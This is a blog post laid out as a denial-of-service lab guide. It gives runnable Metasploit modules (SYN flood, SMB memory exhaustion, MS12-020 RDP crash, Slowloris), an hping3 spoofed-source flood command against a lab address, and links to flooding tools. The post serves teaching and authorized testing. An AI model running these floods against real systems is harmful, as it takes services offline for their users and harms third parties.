---
layout: post
title: "Denial of Service (DoS) Lab Guide"
date: 2025-12-12 10:00:00 +0700
categories: [Hacking]
tags: [DoS, Metasploit, hping3, Slowloris, Impulse, Xerxes, security]
toc: true
pin: true
excerpt: "Step-by-step walkthrough of common DoS attack techniques and lab exercises."
---

# Understanding Denial of Service (DoS) Attacks
{: #overview}

This guide collects the most common DoS (Denial of Service) techniques tested in a controlled laboratory environment. Sections include network‑layer floods, application‑layer abuses, and recommended tools for practise. Always conduct experiments on systems you own or are authorized to test.

## 1. Overview of DoS Attacks

Denial of Service (DoS) is any attempt to make a machine or network resource unavailable to its intended users. Attackers consume bandwidth, memory or processing power by sending an overwhelming volume of malicious or malformed requests.

- **Mechanism:** Flooding the victim with traffic, exploiting protocol weaknesses, or holding connections open indefinitely.
- **Impact:** Reputational damage, service interruptions, financial loss and potential collateral damage to third parties.

---

## 2. Lab Procedures

<a id="tcp-syn-flood"></a>
### A. TCP SYN Flood
This classic network‑layer attack forces the victim to allocate state for half‑open TCP connections until resources are exhausted.

#### Method 1: Metasploit
1. Scan for open ports: `nmap -sS -Pn -p- 192.168.111.112`
2. Launch the auxiliary module:
   ```bash
   use auxiliary/dos/tcp/synflood
   set RHOSTS 192.168.111.112
   run
   ```
3. Features include optional spoofed source addresses and adjustable packet rate.

> **Tip:** Run Wireshark/tcpdump on the target or a mirror port to observe the SYN packets.

#### Method 2: hping3
Send a stream of SYN packets with random source addresses:
```bash
hping3 -S -p 3389 --rand-source --flood 192.168.111.112
```

| Parameter         | Description                                           |
|------------------|-------------------------------------------------------|
| `-S`             | Set SYN flag (SYN scan)                               |
| `-a <addr>`      | Spoof source address                                  |
| `--rand-source`  | Use random source IP for each packet                  |
| `-p <port>`      | Target port (e.g. `22` for SSH, `3389` for RDP)       |
| `--flood`        | Send packets as fast as possible (no replies expected)|

---

### B. SMB Service DoS – Memory Exhaustion (Metasploit)
The `smb_loris` module repeatedly opens and holds SMB file handles until the server runs out of memory.

1. Prepare the attacker (Kali) by raising file descriptor limits:
   ```bash
   ulimit -n 65535   # or unlimited
   ```
2. In Metasploit:
   ```bash
   use auxiliary/dos/smb/smb_loris
   set RHOSTS 192.168.111.112
   run
   ```
3. On the Windows target, open **Task Manager → Performance** to watch memory climb.

---

---

### C. DoS Attack on RDP Service (Windows 7)
Targets unpatched Windows 7 machines by abusing MS12-020, which mishandles channel IDs in RDP.

- **Metasploit module:** `auxiliary/dos/windows/rdp/ms12_020_maxchannelids`
- **Preconditions:** Target must have RDP enabled and not patched.

Running the module sends specially crafted RDP messages; vulnerable hosts may crash with a BSOD.

---

---

### D. HTTP Slowloris – Application Layer Attack (L7)
Slowloris maintains a large number of partial HTTP connections to a web server, preventing it from accepting new clients.

#### Via Metasploit
```bash
use auxiliary/dos/http/slowloris
set RHOSTS 192.168.111.112
run
```
> Tested successfully against IIS on Windows 7 and Apache on Metasploitable‑2. The service becomes unresponsive within 15‑30 seconds.

#### OWASP HTTP DoS Tool
1. Monitor the server with `http://[IP_M2]/server-status` – look for dots (`.`) indicating available slots.
2. Run `top` on the target to watch CPU Idle drop.
3. Execute **HTTP Dos Tool 4.0** on a Windows 7 host.
4. Once all connection slots show `R` (receiving), the site stops responding to new requests.

---

---

## 3. Other Popular DoS Tools

| Tool Name | Description | Reference |
|-----------|-------------|-----------|
| **Impulse** | GUI program incorporating multiple DoS techniques (UDP, SYN, HTTP) | [GitHub](https://github.com/LimerBoy/Impulse) |
| **Xerxes** | Lightweight HTTP flood program written in C | [GitHub](https://github.com/zanyarjamal/xerxes) |
| **HULK** | HTTP Unbearable Load King – randomizes headers to bypass caching | [Packet Storm](https://packetstormsecurity.com/files/112856/HULK-Http-Unbearable-Load-King.html) |

---

## 4. Lab Questions

1. What distinguishes a network-layer flood from an application-layer DoS?
2. Why should DoS testing be confined to lab environments?
3. How can you mitigate a SYN flood on a server?
4. What are the ethical concerns of DoS attacks?

---

> **Disclaimer:** This material is intended for learning and authorized testing only. Never use DoS techniques against systems without explicit permission.
